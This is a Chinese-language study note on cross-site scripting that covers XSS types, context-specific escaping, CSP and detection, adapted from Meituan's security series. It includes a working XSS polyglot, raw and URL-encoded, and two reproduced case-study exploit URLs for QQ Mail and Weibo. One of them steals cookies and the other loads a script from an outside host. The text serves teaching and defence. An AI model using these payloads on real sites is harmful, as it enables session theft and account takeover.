<!--
 * @Author: tangdaoyong
 * @Date: 2021-06-21 22:41:58
 * @LastEditors: tangdaoyong
 * @LastEditTime: 2021-06-22 22:36:55
 * @Description: XSS
-->
# XSS

[美团技术团队-系列文章](https://segmentfault.com/u/meituanjishutuandui)
[xss](https://segmentfault.com/a/1190000016551188)
[浅谈XSS攻击的那些事](https://zhuanlan.zhihu.com/p/26177815)

## 什么是XSS攻击
先上一段标准解释（摘自百度百科）。

**“XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”**
## XSS攻击大致上分为两类：

根据攻击的来源，XSS 攻击可分为存储型、反射型和 DOM 型三种。

类型	存储区*	插入点*
存储型 XSS	后端数据库	HTML
反射型 XSS	URL	HTML
DOM 型 XSS	后端数据库/前端存储/URL	前端 JavaScript
存储区：恶意代码存放的位置。
插入点：由谁取得恶意代码，并插入到网页上。

1. 一类是反射型XSS，又称非持久型XSS，反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。
2. 一类是储存型XSS，也就是持久型XSS。这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

### 存储型 XSS
存储型 XSS 的攻击步骤：

攻击者将恶意代码提交到目标网站的数据库中。
用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。
用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

### 反射型 XSS
反射型 XSS 的攻击步骤：

攻击者构造出特殊的 URL，其中包含恶意代码。
用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
反射型 XSS 跟存储型 XSS 的区别是：存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。

反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。

由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。

POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。

### DOM 型 XSS
DOM 型 XSS 的攻击步骤：

攻击者构造出特殊的 URL，其中包含恶意代码。
用户打开带有恶意代码的 URL。
用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
DOM 型 XSS 跟前两种 XSS 的区别：DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

### 什么是反射型XSS
其实，我们上面讲XSS的利用手段时所举的例子都是非持久型XSS。

也就是攻击相对于访问者而言是一次性的，具体表现在我们把我们的恶意脚本通过url的方式传递给了服务器，而服务器则只是不加处理的把脚本“反射”回访问者的浏览器而使访问者的浏览器执行相应的脚本。

也就是说想要触发漏洞，需要访问特定的链接才能够实现。

### 什么是储存型XSS
它与反射型XSS最大的不同就是服务器再接收到我们的恶意脚本时会将其做一些处理。

例如储存到数据库中，然后当我们再次访问相同页面时，将恶意脚本从数据库中取出并返回给浏览器执行。这就意味着只要访问了这个页面的访客，都有可能会执行这段恶意脚本，因此储存型XSS的危害会更大。

还记得在文章开头提到的留言板的例子吗？那通常就是储存型XSS。当有人在留言内容中插入恶意脚本时，由于服务器要像每一个访客展示之前的留言内容，所以后面的访客自然会接收到之前留言中的恶意脚本而不幸躺枪。

这个过程一般而言只要用户访问这个界面就行了，不像反射型XSS，需要访问特定的URL。

## 防范手段
都说知己知彼方能百战不殆，知道了xss攻击的原理那么防御的方法也就显而易见了。

1. 首先是过滤。对诸如<script>、<img>、<a>等标签进行过滤。
2. 其次是编码。像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。
3. 最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。

## 编码

通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。
攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。
攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。
通过 HTML 转义，可以防止 XSS 攻击。`<span style="color:red">[事情当然没有这么简单啦！请继续往下看]</span>`。

字符	转义后的字符
&	&amp;
<	&lt;
>	&gt;
"	&quot;
'	&#x27;
/	&#x2F;

* 做了 HTML 转义，并不等于高枕无忧。对于链接跳转，如 `<a href="xxx"` 或 `location.href="xxx"`，要检验其内容，禁止以 `javascript:` 开头的链接，和其他非法的 scheme。

在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
在 onload、onerror、onclick 等事件中，注入不受控制代码。
在 style 属性和标签中，包含类似 background-image:url("javascript:..."); 的代码（新版本浏览器已经可以防范）。
在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。

XSS 攻击的预防
通过前面的介绍可以得知，XSS 攻击有两大要素：

攻击者提交恶意代码。
浏览器执行恶意代码。
针对第一个要素：我们是否能够在用户输入的过程，过滤掉用户输入的恶意代码呢？

输入过滤
在用户提交时，由前端过滤输入，然后提交到后端。这样做是否可行呢？

答案是不可行。一旦攻击者绕过前端过滤，直接构造请求，就可以提交恶意代码了。

那么，换一个过滤时机：后端在写入数据库前，对输入进行过滤，然后把“安全的”内容，返回给前端。这样是否可行呢？

我们举一个例子，一个正常的用户输入了 5 < 7 这个内容，在写入数据库前，被转义，变成了 5 &lt; 7。

问题是：在提交阶段，我们并不确定内容要输出到哪里。

这里的“并不确定内容要输出到哪里”有两层含义：

用户的输入内容可能同时提供给前端和客户端，而一旦经过了 escapeHTML()，客户端显示的内容就变成了乱码( 5 &lt; 7 )。
在前端中，不同的位置所需的编码也不同。

当 5 &lt; 7 作为 HTML 拼接页面时，可以正常显示：

<div title="comment">5 &lt; 7</div>
当 5 &lt; 7 通过 Ajax 返回，然后赋值给 JavaScript 的变量时，前端得到的字符串就是转义后的字符。这个内容不能直接用于 Vue 等模板的展示，也不能直接用于内容长度计算。不能用于标题、alert 等。
所以，输入侧过滤能够在某些情况下解决特定的 XSS 问题，但会引入很大的不确定性和乱码问题。在防范 XSS 攻击时应避免此类方法。

当然，对于明确的输入类型，例如数字、URL、电话号码、邮件地址等等内容，进行输入过滤还是必要的。

**既然输入过滤并非完全可靠，我们就要通过“防止浏览器执行恶意代码”来防范 XSS。这部分分为两类：**

* 防止 HTML 中出现注入。
* 防止 JavaScript 执行时，执行恶意代码。

## 预防存储型和反射型 XSS 攻击
存储型和反射型 XSS 都是在服务端取出恶意代码后，插入到响应 HTML 里的，攻击者刻意编写的“数据”被内嵌到“代码”中，被浏览器所执行。

预防这两种漏洞，有两种常见做法：

改成纯前端渲染，把代码和数据分隔开。
对 HTML 做充分转义。
纯前端渲染
纯前端渲染的过程：

浏览器先加载一个静态 HTML，此 HTML 中不包含任何跟业务相关的数据。
然后浏览器执行 HTML 中的 JavaScript。
JavaScript 通过 Ajax 加载业务数据，调用 DOM API 更新到页面上。
在纯前端渲染中，我们会明确的告诉浏览器：下面要设置的内容是文本（.innerText），还是属性（.setAttribute），还是样式（.style）等等。浏览器不会被轻易的被欺骗，执行预期外的代码了。

但纯前端渲染还需注意避免 DOM 型 XSS 漏洞（例如 onload 事件和 href 中的 javascript:xxx 等，请参考下文”预防 DOM 型 XSS 攻击“部分）。

**在很多内部、管理系统中，采用纯前端渲染是非常合适的。但对于性能要求高，或有 SEO 需求的页面，我们仍然要面对拼接 HTML 的问题。**

转义 HTML
如果拼接 HTML 是必要的，就需要采用合适的转义库，对 HTML 模板各处插入点进行充分的转义。

常用的模板引擎，如 `doT.js`、`ejs`、`FreeMarker` 等，对于 HTML 转义通常只有一个规则，就是把 & < > " ' / 这几个字符转义掉，确实能起到一定的 XSS 防护作用，但并不完善：

XSS 安全漏洞	简单转义是否有防护作用
HTML 标签文字内容	有
HTML 属性值	有
CSS 内联样式	无
内联 JavaScript	无
内联 JSON	无
跳转链接	无
所以要完善 XSS 防护措施，我们要使用更完善更细致的转义策略。

例如 Java 工程里，常用的转义库为 org.owasp.encoder。以下代码引用自 org.owasp.encoder 的官方说明。

<!-- HTML 标签内文字内容 -->
<div><%= Encode.forHtml(UNTRUSTED) %></div>

<!-- HTML 标签属性值 -->
<input value="<%= Encode.forHtml(UNTRUSTED) %>" />

<!-- CSS 属性值 -->
<div style="width:<= Encode.forCssString(UNTRUSTED) %>">

<!-- CSS URL -->
<div style="background:<= Encode.forCssUrl(UNTRUSTED) %>">

<!-- JavaScript 内联代码块 -->
<script>
  var msg = "<%= Encode.forJavaScript(UNTRUSTED) %>";
  alert(msg);
</script>

<!-- JavaScript 内联代码块内嵌 JSON -->
<script>
var __INITIAL_STATE__ = JSON.parse('<%= Encoder.forJavaScript(data.to_json) %>');
</script>

<!-- HTML 标签内联监听器 -->
<button
  onclick="alert('<%= Encode.forJavaScript(UNTRUSTED) %>');">
  click me
</button>

<!-- URL 参数 -->
<a href="/search?value=<%= Encode.forUriComponent(UNTRUSTED) %>&order=1#top">

<!-- URL 路径 -->
<a href="/page/<%= Encode.forUriComponent(UNTRUSTED) %>">

<!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
-->
<a href='<%=
  urlValidator.isValid(UNTRUSTED) ?
    Encode.forHtml(UNTRUSTED) :
    "/404"
%>'>
  link
</a>
可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。

## 预防 DOM 型 XSS 攻击
DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。

在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。

如果用 `Vue/React` 技术栈，并且不使用 `v-html/dangerouslySetInnerHTML` 功能，就在前端 `render` 阶段避免 `innerHTML`、`outerHTML` 的 `XSS` 隐患。

`DOM` 中的内联事件监听器，如 `location、onclick、onerror、onload、onmouseover` 等，`<a>` 标签的 `href` 属性，`JavaScript` 的 `eval()、setTimeout()、setInterval()` 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 `API`，很容易产生安全隐患，请务必避免。

<!-- 内联事件监听器中包含恶意代码 -->
<img onclick="UNTRUSTED" onerror="UNTRUSTED" src="data:image/png,">

<!-- 链接内包含恶意代码 -->
<a href="UNTRUSTED">1</a>

<script>
// setTimeout()/setInterval() 中调用恶意代码
setTimeout("UNTRUSTED")
setInterval("UNTRUSTED")

// location 调用恶意代码
location.href = 'UNTRUSTED'

// eval() 中调用恶意代码
eval("UNTRUSTED")
</script>
如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。

其他 XSS 防范措施
虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。

## Content Security Policy
严格的 CSP 在 XSS 的防范中可以起到以下的作用：

* 禁止加载外域代码，防止复杂的攻击逻辑。
* 禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。
* 禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。
* 禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。
* 合理使用上报可以及时发现 XSS，利于尽快修复问题。
* 关于 CSP 的详情，请关注前端安全系列后续的文章。

## 输入内容长度控制
对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。

## 其他安全措施
* HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。
* 验证码：防止脚本冒充用户提交危险操作。

## XSS 的检测
上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？

经过一番搜索，小明找到了两个方法：

1. 使用通用 XSS 攻击字符串手动检测 XSS 漏洞。
2. 使用扫描工具自动检测 XSS 漏洞。
在[Unleashing an Ultimate XSS Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)一文中，小明发现了这么一个字符串：
```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 `eval()、setTimeout()、setInterval()、Function()、innerHTML、document.write()` 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。

小明只要在网站的各输入框中提交这个`字符串`，或者把它拼接到 `URL` 参数上，就可以进行检测了。
```js
http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E
```
除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 `Arachni、Mozilla HTTP Observatory、w3af` 等。

XSS 攻击的总结
我们回到最开始提出的问题，相信同学们已经有了答案：

XSS 防范是后端 RD 的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。

不正确。因为：

防范存储型和反射型 XSS 是后端 RD 的责任。而 DOM 型 XSS 攻击不发生在后端，是前端 RD 的责任。防范 XSS 是需要后端 RD 和前端 RD 共同参与的系统工程。
转义应该在输出 HTML 时进行，而不是在提交用户输入时。
所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。

不正确。
不同的上下文，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致。
业务 RD 需要选取合适的转义库，并针对不同的上下文调用不同的转义规则。
整体的 XSS 防范是非常复杂和繁琐的，我们不仅需要在全部需要转义的位置，对数据进行对应的转义。而且要防止多余和错误的转义，避免正常的用户输入出现乱码。

虽然很难通过技术手段完全避免 XSS，但我们可以总结以下原则减少漏洞的产生：

利用模板引擎
开启模板引擎自带的 HTML 转义功能。例如：
在 ejs 中，尽量使用 <%= data %> 而不是 <%- data %>；
在 doT.js 中，尽量使用 {{! data } 而不是 {{= data }；
在 FreeMarker 中，确保引擎版本高于 2.3.24，并且选择正确的 freemarker.core.OutputFormat。
避免内联事件
尽量不要使用 onLoad="onload('{{data}}')"、onClick="go('{{action}}')" 这种拼接内联事件的写法。在 JavaScript 中通过 .addEventlistener() 事件绑定会更安全。
避免拼接 HTML
前端采用拼接 HTML 的方法比较危险，如果框架允许，使用 createElement、setAttribute 之类的方法实现。或者采用比较成熟的渲染框架，如 Vue/React 等。
时刻保持警惕
在插入位置为 DOM 属性、链接等位置时，要打起精神，严加防范。
增加攻击难度，降低攻击后果
通过 CSP、输入长度配置、接口安全措施等方法，增加攻击的难度，降低攻击的后果。
主动检测和发现
可使用 XSS 攻击字符串和自动扫描工具寻找潜在的 XSS 漏洞。
XSS 攻击案例
QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞
攻击者发现 http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。

于是攻击者构建出一个 URL，并引导用户去点击：
http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B

用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：

<script>
getTop().location.href="/cgi-bin/loginpage?autologin=n&errtype=1&verify=&clientuin=aaa"+"&t="+"&d=bbbb";return false;</script><script>alert(document.cookie)</script>"+"...
浏览器接收到响应后就会执行 alert(document.cookie)，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。

新浪微博名人堂反射型 XSS 漏洞
攻击者发现 http://weibo.com/pub/star/g/xyyyd 这个 URL 的内容未经过滤直接输出到 HTML 中。

于是攻击者构建出一个 URL，然后诱导用户去点击：

http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>

用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：

<li><a href="http://weibo.com/pub/star/g/xyyyd"><script src=//xxxx.cn/image/t.js></script>">按分类检索</a></li>
浏览器接收到响应后就会加载执行恶意脚本 //xxxx.cn/image/t.js，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。

扩展阅读：Automatic Context-Aware Escaping
上文我们说到：

合适的 HTML 转义可以有效避免 XSS 漏洞。
完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。
业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。
通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。

这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。

2009年，Google 提出了一个概念叫做：Automatic Context-Aware Escaping。

所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。

在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：

<html>
  <head>
    <meta charset="UTF-8">
    <title>{{.title}}</title>
  </head>
  <body>
    <a href="{{.url}}">{{.content}}</a>
  </body>
</html>
模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：

<html>
  <head>
    <meta charset="UTF-8">
    <title>{{.title | htmlescaper}}</title>
  </head>
  <body>
    <a href="{{.url | urlescaper | attrescaper}}">{{.content | htmlescaper}}</a>
  </body>
</html>
目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：

[go html/template](https://golang.org/pkg/html/template/)
[Google Closure Templates](https://developers.google.com/closure/templates/docs/security)
课后作业：XSS 攻击小游戏
以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。

在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。

alert(1) to win
prompt(1) to win
XSS game